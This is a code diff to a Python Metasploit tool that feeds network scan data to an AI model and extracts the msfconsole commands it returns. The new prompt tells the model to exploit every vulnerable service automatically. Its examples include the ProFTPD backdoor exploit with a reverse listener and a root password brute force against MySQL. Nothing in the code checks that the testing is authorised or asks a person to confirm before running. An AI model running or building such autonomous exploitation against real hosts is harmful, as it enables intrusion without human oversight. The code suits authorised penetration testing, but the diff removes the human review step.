@@ -61,6 +61,11 @@ class MetasploitTool(BaseTool):
             
             ai_response = response['message']['content']
             
+            # Debug: Show AI response
+            if not ai_response or len(ai_response.strip()) < 10:
+                console.print(f"[yellow]Warning: AI returned empty or very short response[/yellow]")
+                console.print(f"[dim]Response: {ai_response}[/dim]")
+            
             # Extract commands from AI response
             commands = self.extract_commands(ai_response)
             
@@ -102,39 +107,58 @@ class MetasploitTool(BaseTool):
             
             context_info += "\n=== END SCAN DATA ===\n"
         
-        prompt = f"""You are a Metasploit expert. Generate msfconsole commands to help with security testing.
+        prompt = f"""You are a Metasploit penetration testing expert performing authorized security testing.
 
 {context_info}
 
-RULES:
-1. Generate actual msfconsole commands that can be executed
-2. Use the scan data above to target specific services/versions
-3. Start with search commands to find relevant exploits
-4. Suggest appropriate exploits based on detected services
-5. Include commands to set RHOSTS, RPORT, and other options
-6. Format commands as a list, one per line
-7. Use 'search' to find exploits for specific services/versions
-8. Suggest 'use' commands for promising exploits
-9. Include 'info' commands to learn about exploits
-10. ONLY output msfconsole commands, nothing else
+YOUR MISSION: Automatically exploit vulnerabilities found in the scan data above.
 
-COMMAND FORMAT:
+CRITICAL RULES:
+1. AUTOMATICALLY select and configure exploits for vulnerable services
+2. Use the scan data to target specific services/versions
+3. For EACH vulnerable service, generate a COMPLETE exploit attempt
+4. Include ALL necessary configuration (RHOSTS, RPORT, LHOST, LPORT, payload)
+5. Use 'check' command first to verify if target is vulnerable
+6. Then use 'exploit' or 'run' command to attempt exploitation
+7. Format as actual executable msfconsole commands, one per line
+
+EXPLOITATION STRATEGY:
+- For FTP (ProFTPD, vsftpd, etc.): Search version-specific exploits
+- For SSH: Try auxiliary/scanner modules, check for weak auth
+- For HTTP/Apache: Check for path traversal, RCE vulnerabilities
+- For MySQL: Try authentication bypass, SQL injection modules
+- For SMTP/Mail services: Check for command injection
+- For any service: ALWAYS configure and RUN the exploit, don't just search
+
+COMMAND STRUCTURE FOR EACH EXPLOIT ATTEMPT:
 search <service> <version>
-use <exploit/path>
-set RHOSTS <target>
-set RPORT <port>
-info
+use <exploit/path/to/module>
+set RHOSTS <target_ip_or_hostname>
+set RPORT <port_number>
+set LHOST <your_ip>
+set LPORT 4444
+check
+exploit
+
+EXAMPLE (if ProFTPD detected on port 21):
+search proftpd
+use exploit/unix/ftp/proftpd_133c_backdoor
+set RHOSTS {scan_context.get('target', 'TARGET') if scan_context else 'TARGET'}
+set RPORT 21
+set LHOST tun0
+check
+exploit
+
+EXAMPLE (if MySQL detected on port 3306):
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS {scan_context.get('target', 'TARGET') if scan_context else 'TARGET'}
+set RPORT 3306
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
 run
 
-Example based on scan data:
-If MySQL 5.5.60 is detected on port 3306:
-search mysql 5.5
-use exploit/linux/mysql/mysql_yassl_hello
-set RHOSTS target.com
-set RPORT 3306
-info
-
-OUTPUT ONLY COMMANDS, NO EXPLANATIONS."""
+OUTPUT ONLY EXECUTABLE COMMANDS - NO EXPLANATIONS, NO MARKDOWN, NO COMMENTS.
+Generate commands for AT LEAST 2-3 different exploits based on the scan data."""
 
         return prompt
     
@@ -142,7 +166,7 @@ OUTPUT ONLY COMMANDS, NO EXPLANATIONS."""
         """Extract msfconsole commands from AI response"""
         commands = []
         
-        # Look for code blocks
+        # Look for code blocks first
         code_block_pattern = r'```(?:bash|shell|console|msfconsole)?\n(.*?)```'
         matches = re.findall(code_block_pattern, ai_response, re.DOTALL)
         
@@ -151,17 +175,28 @@ OUTPUT ONLY COMMANDS, NO EXPLANATIONS."""
                 lines = block.strip().split('\n')
                 for line in lines:
                     line = line.strip()
-                    if line and not line.startswith('#'):
+                    if line and not line.startswith('#') and not line.startswith('//'):
                         commands.append(line)
-        else:
-            # Try extracting line by line
+        
+        # If no code blocks, try extracting line by line
+        if not commands:
             lines = ai_response.split('\n')
-            msf_commands = ['search', 'use', 'set', 'show', 'info', 'run', 'exploit', 'check', 'options']
+            msf_commands = ['search', 'use', 'set', 'show', 'info', 'run', 'exploit', 
+                          'check', 'options', 'sessions', 'back', 'exit']
             
             for line in lines:
                 line = line.strip()
-                if any(line.startswith(cmd) for cmd in msf_commands):
+                # Remove common prefixes like "- ", "* ", "1. ", etc.
+                line = re.sub(r'^[-*•]\s*', '', line)
+                line = re.sub(r'^\d+\.\s*', '', line)
+                
+                if any(line.startswith(cmd + ' ') or line == cmd for cmd in msf_commands):
                     commands.append(line)
+        
+        # Debug output
+        if not commands:
+            console.print(f"[yellow]Debug: Could not extract commands from AI response[/yellow]")
+            console.print(f"[dim]AI Response preview: {ai_response[:300]}...[/dim]")
         
         return commands
     
